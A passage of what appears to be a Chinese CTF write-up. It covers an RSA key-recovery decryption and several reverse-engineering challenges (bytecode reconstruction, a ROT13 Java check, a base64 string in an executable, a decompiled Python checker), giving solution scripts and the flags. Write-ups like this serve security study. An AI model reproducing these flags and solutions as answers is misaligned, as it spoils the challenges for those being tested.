15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span></span><br><span class="line">    d = <span class="number">0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1</span></span><br><span class="line">    pprime = <span class="number">0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3</span></span><br><span class="line">    qprime = <span class="number">0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b</span></span><br><span class="line">    k, t, l = brute_k_t_l(pprime, qprime, e, d)</span><br><span class="line"></span><br><span class="line">    lp, lq = qprime + k, pprime + t</span><br><span class="line">    <span class="keyword">assert</span> lp % l == <span class="number">0</span>, lq % l == <span class="number">0</span></span><br><span class="line">    p, q = lp // l, lq // l</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_prime(p), gmpy2.is_prime(q)</span><br><span class="line">    N = p*q</span><br><span class="line"></span><br><span class="line">    c = <span class="number">0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386</span></span><br><span class="line">    flag_decoded = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag_decoded))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;flag&#123;c4617a206ba83d7f824dc44e5e67196a&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h3><blockquote><p>re签到题，格式：flag{output}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">0: const 60 ; &lt;module &#x27;main&#x27;&gt; </span><br><span class="line">5: module 9 592</span><br><span class="line">11: const 26 ; 83 </span><br><span class="line">16: const 27 ; 69 </span><br><span class="line">21: const 28 ; 65 </span><br><span class="line">26: array 3</span><br><span class="line">31: store 0 0</span><br><span class="line">34: const 30 ; 101 </span><br><span class="line">39: const 31 ; 108 </span><br><span class="line">44: const 32 ; 111 </span><br><span class="line">49: const 33 ; 117 </span><br><span class="line">54: const 34 ; 122 </span><br><span class="line">59: const 30 ; 101 </span><br><span class="line">64: const 35 ; 105 </span><br><span class="line">69: const 36 ; 98 </span><br><span class="line">74: const 30 ; 101 </span><br><span class="line">79: const 31 ; 108 </span><br><span class="line">84: const 33 ; 117 </span><br><span class="line">89: const 35 ; 105 </span><br><span class="line">94: const 37 ; 113 </span><br><span class="line">99: const 33 ; 117 </span><br><span class="line">104: const 35 ; 105 </span><br><span class="line">109: const 37 ; 113 </span><br><span class="line">114: array 16</span><br><span class="line">119: store 0 1</span><br><span class="line">122: const 39 ; 0 </span><br><span class="line">127: store 0 2</span><br><span class="line">130: array 0</span><br><span class="line">135: store 0 3</span><br><span class="line">138: load 0 2</span><br><span class="line">141: const 42 ; 256 </span><br><span class="line">146: lt</span><br><span class="line">147: jz 184</span><br><span class="line">152: load 0 3</span><br><span class="line">155: const 43 ; append </span><br><span class="line">160: getattr</span><br><span class="line">161: load 0 2</span><br><span class="line">164: call 1</span><br><span class="line">166: pop</span><br><span class="line">167: load 0 2</span><br><span class="line">170: const 44 ; 1 </span><br><span class="line">175: add</span><br><span class="line">176: store 0 2</span><br><span class="line">179: jmp 138</span><br><span class="line">184: const 39 ; 0 </span><br><span class="line">189: store 0 4</span><br><span class="line">192: load 0 4</span><br><span class="line">195: const 42 ; 256 </span><br><span class="line">200: lt</span><br><span class="line">201: jz 271</span><br><span class="line">206: load 0 3</span><br><span class="line">209: load 0 4</span><br><span class="line">212: getitem</span><br><span class="line">213: load 0 0</span><br><span class="line">216: load 0 4</span><br><span class="line">219: const 46 ; 3 </span><br><span class="line">224: mod</span><br><span class="line">225: getitem</span><br><span class="line">226: add</span><br><span class="line">227: load 0 1</span><br><span class="line">230: load 0 4</span><br><span class="line">233: const 47 ; 16 </span><br><span class="line">238: mod</span><br><span class="line">239: getitem</span><br><span class="line">240: add</span><br><span class="line">241: const 42 ; 256 </span><br><span class="line">246: mod</span><br><span class="line">247: load 0 3</span><br><span class="line">250: load 0 4</span><br><span class="line">253: setitem</span><br><span class="line">254: load 0 4</span><br><span class="line">257: const 44 ; 1 </span><br><span class="line">262: add</span><br><span class="line">263: store 0 4</span><br><span class="line">266: jmp 192</span><br><span class="line">271: const 39 ; 0 </span><br><span class="line">276: store 0 5</span><br><span class="line">279: load 0 5</span><br><span class="line">282: const 46 ; 3 </span><br><span class="line">287: lt</span><br><span class="line">288: jz 448</span><br><span class="line">293: const 39 ; 0 </span><br><span class="line">298: store 0 6</span><br><span class="line">301: load 0 6</span><br><span class="line">304: const 42 ; 256 </span><br><span class="line">309: lt</span><br><span class="line">310: jz 366</span><br><span class="line">315: load 0 3</span><br><span class="line">318: load 0 6</span><br><span class="line">321: getitem</span><br><span class="line">322: load 0 3</span><br><span class="line">325: load 0 6</span><br><span class="line">328: const 44 ; 1 </span><br><span class="line">333: add</span><br><span class="line">334: const 42 ; 256 </span><br><span class="line">339: mod</span><br><span class="line">340: getitem</span><br><span class="line">341: bxor</span><br><span class="line">342: load 0 3</span><br><span class="line">345: load 0 6</span><br><span class="line">348: setitem</span><br><span class="line">349: load 0 6</span><br><span class="line">352: const 44 ; 1 </span><br><span class="line">357: add</span><br><span class="line">358: store 0 6</span><br><span class="line">361: jmp 301</span><br><span class="line">366: const 39 ; 0 </span><br><span class="line">371: store 0 7</span><br><span class="line">374: load 0 7</span><br><span class="line">377: const 42 ; 256 </span><br><span class="line">382: lt</span><br><span class="line">383: jz 431</span><br><span class="line">388: load 0 3</span><br><span class="line">391: load 0 7</span><br><span class="line">394: getitem</span><br><span class="line">395: const 44 ; 1 </span><br><span class="line">400: add</span><br><span class="line">401: const 42 ; 256 </span><br><span class="line">406: mod</span><br><span class="line">407: load 0 3</span><br><span class="line">410: load 0 7</span><br><span class="line">413: setitem</span><br><span class="line">414: load 0 7</span><br><span class="line">417: const 44 ; 1 </span><br><span class="line">422: add</span><br><span class="line">423: store 0 7</span><br><span class="line">426: jmp 374</span><br><span class="line">431: load 0 5</span><br><span class="line">434: const 44 ; 1 </span><br><span class="line">439: add</span><br><span class="line">440: store 0 5</span><br><span class="line">443: jmp 279</span><br><span class="line">448: const 39 ; 0 </span><br><span class="line">453: store 0 5</span><br><span class="line">456: const 39 ; 0 </span><br><span class="line">461: store 0 8</span><br><span class="line">464: load 0 5</span><br><span class="line">467: const 42 ; 256 </span><br><span class="line">472: lt</span><br><span class="line">473: jz 509</span><br><span class="line">478: load 0 8</span><br><span class="line">481: load 0 3</span><br><span class="line">484: load 0 5</span><br><span class="line">487: getitem</span><br><span class="line">488: add</span><br><span class="line">489: store 0 8</span><br><span class="line">492: load 0 5</span><br><span class="line">495: const 44 ; 1 </span><br><span class="line">500: add</span><br><span class="line">501: store 0 5</span><br><span class="line">504: jmp 464</span><br><span class="line">509: load 0 8</span><br><span class="line">512: const 51 ; 20 </span><br><span class="line">517: mul</span><br><span class="line">518: const 52 ; 5 </span><br><span class="line">523: add</span><br><span class="line">524: store 0 8</span><br><span class="line">527: load 0 8</span><br><span class="line">530: const 54 ; 30 </span><br><span class="line">535: mul</span><br><span class="line">536: const 52 ; 5 </span><br><span class="line">541: sub</span><br><span class="line">542: store 0 8</span><br><span class="line">545: load 0 8</span><br><span class="line">548: const 56 ; 40 </span><br><span class="line">553: mul</span><br><span class="line">554: const 52 ; 5 </span><br><span class="line">559: sub</span><br><span class="line">560: store 0 8</span><br><span class="line">563: load 0 8</span><br><span class="line">566: const 58 ; 50 </span><br><span class="line">571: mul</span><br><span class="line">572: const 59 ; 6645 </span><br><span class="line">577: add</span><br><span class="line">578: store 0 8</span><br><span class="line">581: const 23 ; &lt;function &#x27;print&#x27;&gt; </span><br><span class="line">586: load 0 8</span><br><span class="line">589: call 1</span><br><span class="line">591: pop</span><br></pre></td></tr></table></figure></blockquote><p>根据bytecode还原代码，需要注意数组的存储顺序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">83</span>,<span class="number">69</span>,<span class="number">65</span>][::-<span class="number">1</span>]</span><br><span class="line">c = [<span class="number">101</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">122</span>,<span class="number">101</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">113</span>][::-<span class="number">1</span>]</span><br><span class="line">S = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S[j] = (S[j]+key[j%<span class="number">3</span>]+c[j%<span class="number">16</span>])%<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S[x] = S[x]^S[(x+<span class="number">1</span>)%<span class="number">256</span>]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S[y] = (S[y]+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    b = b+S[k]</span><br><span class="line"></span><br><span class="line">b = b*<span class="number">20</span>+<span class="number">5</span></span><br><span class="line">b = b*<span class="number">30</span>-<span class="number">5</span></span><br><span class="line">b = b*<span class="number">40</span>-<span class="number">5</span></span><br><span class="line">b = b*<span class="number">50</span>+<span class="number">6645</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 23075096395</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;23075096395&#125;</code></p><p>​    </p><h3 id="combat-slogan"><a href="#combat-slogan" class="headerlink" title="combat_slogan"></a>combat_slogan</h3><blockquote><p>面对疫情，我们的口号是什么？flag{input}</p></blockquote><p>用jd工具分析jar，在Main.class发现主代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xaut;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">stringTransformAscii</span><span class="params">(String value)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sbu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">    <span class="type">char</span>[] chars = value.toCharArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (i != chars.length - <span class="number">1</span>) &#123;</span><br><span class="line">        sbu.append(chars[i]).append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sbu.append(chars[i]);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> sbu.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">ttk</span><span class="params">(String input)</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class="line">      <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> input.charAt(i);</span><br><span class="line">      <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;m&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="type">char</span>)(c + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="type">char</span>)(c + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;n&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="type">char</span>)(c - <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;N&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="type">char</span>)(c - <span class="number">13</span>);</span><br><span class="line">      &#125; </span><br><span class="line">      sb.append(c);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Please input your keyword);</span></span><br><span class="line"><span class="string">    Scanner scan = new Scanner(System.in);</span></span><br><span class="line"><span class="string">    String str2 = &quot;</span>ddd<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    if (scan.hasNextLine())</span></span><br><span class="line"><span class="string">      str2 = scan.nextLine(); </span></span><br><span class="line"><span class="string">    scan.close();</span></span><br><span class="line"><span class="string">    String stringTransformAscii = stringTransformAscii(str2);</span></span><br><span class="line"><span class="string">    String[] offerCodeString = stringTransformAscii.split(&quot;</span>,<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    StringBuffer str5 = new StringBuffer();</span></span><br><span class="line"><span class="string">    for (String s : offerCodeString)</span></span><br><span class="line"><span class="string">      str5.append(s); </span></span><br><span class="line"><span class="string">    int flag = ttk(str2).compareTo(&quot;</span>Jr_j11y_s1tug_g0_raq_g0_raq_pnml<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    if (flag == 0 &amp;&amp; str5.toString().compareTo(&quot;</span><span class="number">871019511949491089510249103104116951164895101110100951164895101110100959997122121</span><span class="string">&quot;) == 0) &#123;</span></span><br><span class="line"><span class="string">      System.out.println(&quot;</span>Your keyword is correct!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125; else &#123;</span></span><br><span class="line"><span class="string">      System.out.println(&quot;</span>Your keyword is wrong!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>flag经 <code>ttk()</code> 函数处理后与 <code>Jr_j11y_s1tug_g0_raq_g0_raq_pnml</code> 相同，逆 <code>ttk()</code> 替换函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&#x27;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)-<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)+<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(k)+<span class="number">13</span> &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k)+<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t += k</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We_w11l_f1ght_t0_end_t0_end_cazy</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125;</code></p><p>​    </p><h3 id="cute-doge"><a href="#cute-doge" class="headerlink" title="cute_doge"></a>cute_doge</h3><blockquote><p>普通的柴犬，戳一戳会发生什么奇妙的事情呢？</p></blockquote><p>将exe用16进制工具查看，根据运行提示文字找到附近存在 <code>ZmxhZ3tDaDFuYV95eWRzX2Nhenl9</code>，base64解码得flag：<code>flag&#123;Ch1na_yyds_cazy&#125;</code>。</p><p>​    </p><h3 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h3><blockquote><p>初次见面，送个python题，祝您接下来解题顺利，flag{input}</p></blockquote><p>uncompyle6反编译pyc文件得源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_1</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [</span><br><span class="line">     <span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    f = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(f) != <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Your input is illegal&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="built_in">list</span>(f)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">            flag[j] = <span class="built_in">ord</span>(i)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag to &#x27;ord&#x27;:&quot;</span>, flag)</span><br><span class="line">            